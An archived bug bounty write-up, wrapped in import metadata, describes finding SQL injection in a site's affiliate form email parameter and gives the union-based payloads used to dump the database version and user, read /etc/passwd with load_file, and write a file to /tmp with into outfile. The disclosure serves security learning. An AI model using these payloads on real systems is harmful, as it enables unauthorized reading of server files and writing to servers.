---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-02-05_sql-injection-with-load-file-and-into-outfile.md
original_filename: 2018-02-05_sql-injection-with-load-file-and-into-outfile.md
title: SQL injection with load file and into outfile
category: documents
detected_topics:
- sqli
- command-injection
tags:
- imported
- documents
- sqli
- command-injection
language: en
raw_sha256: 36416358fe326b4759a258a6873ceea3822f69f36d21f30783a791e96c838679
text_sha256: 63b9599d7138b8be656f063bc0e9d713ac3d079e0624a76b4e05fd59db874eab
ingested_at: '2026-06-28T07:31:56Z'
sensitivity: unknown
redactions_applied: false
---

# SQL injection with load file and into outfile

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-02-05_sql-injection-with-load-file-and-into-outfile.md
- Source Type: markdown
- Detected Topics: sqli, command-injection
- Ingested At: 2026-06-28T07:31:56Z
- Redactions Applied: False
- Raw SHA256: `36416358fe326b4759a258a6873ceea3822f69f36d21f30783a791e96c838679`
- Text SHA256: `63b9599d7138b8be656f063bc0e9d713ac3d079e0624a76b4e05fd59db874eab`


## Content

---
title: "SQL injection with load file and into outfile"
url: "https://medium.com/bugbountywriteup/sql-injection-with-load-file-and-into-outfile-c62f7d92c4e2"
authors: ["NoGe (@p4c3n0g3)"]
bugs: ["SQL injection"]
bounty: "750"
publication_date: "2018-02-05"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5984
scraped_via: "browseros"
---

# SQL injection with load file and into outfile

SQL injection with load file and into outfile
Kswari
Follow
2 min read
·
Feb 5, 2018

1K

8

Well this submission make me get the patient badge on h1 coz it’s more then 6 month (1 year) hehehehehe. I got sqli vulnerability when test with apostrophe (‘). Sorry for the redacted guys. 😛

Get Kswari’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

I do register as affiliate on the web as usual.

Press enter or click to view image in full size

Then got redirect to POST all form information here https://www.blablabla.com/svc/*****/form_affiliate. Select it and send to repeater. The vulnerable parameter is email.

Press enter or click to view image in full size

On request box, i input this SQL command in “email” parameter ‘ and 1=2 union all select concat_ws(0x3a,version(),user(),database()) — and click Go (this command will show version, user and database name)

Press enter or click to view image in full size

The result is shown on response box “5.5.41-log:root@10.130.*.**:tp_cart”. Now i try to change the SQL command with this load file command ‘ and 1=2 union all select load_file(‘/etc/passwd’) and boom! got the passwd.

Press enter or click to view image in full size

Change the load file command with into outfile command to create a file on /tmp ‘ and 1=2 union all select ‘blablabla_bug_bounty_program’ into outfile ‘/tmp/blablabla’ — that command means write blablabla_bug_bounty_program into blablabla file on /tmp directory.

Press enter or click to view image in full size

Now i use load file again to see the file is created or not using this command ‘ and 1=2 union all select load_file(‘/tmp/blablabla’)

Press enter or click to view image in full size

And it’s created successfully! So i got sqli and also can create a file on the server.

Happy hacking guys! 😃
